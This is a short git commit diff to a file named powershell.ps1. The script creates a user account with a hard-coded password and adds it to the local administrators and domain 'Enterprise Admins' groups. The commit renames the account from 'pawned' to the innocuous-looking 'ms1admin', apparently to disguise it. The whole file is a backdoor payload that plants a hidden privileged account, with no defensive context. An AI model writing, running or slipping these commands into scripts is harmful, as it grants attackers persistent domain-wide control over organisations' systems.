9dd71638a296bb421c12d0216d4277c62722999e
Jarmo Haaranen <44770817+haaranenjarmo@users.noreply.github.com>
2021-05-10 09:23:04 +0300

    Update powershell.ps1

--- powershell.ps1
+++ powershell.ps1
@@ -1,3 +1,3 @@
-net user /add pawned Password12345!
-net localgroup administrators pawned /add
-net group "Enterprise Admins" pawned /add
+net user /add ms1admin Ru05Kaa1389!
+net localgroup administrators ms1admin /add
+net group "Enterprise Admins" ms1admin /add
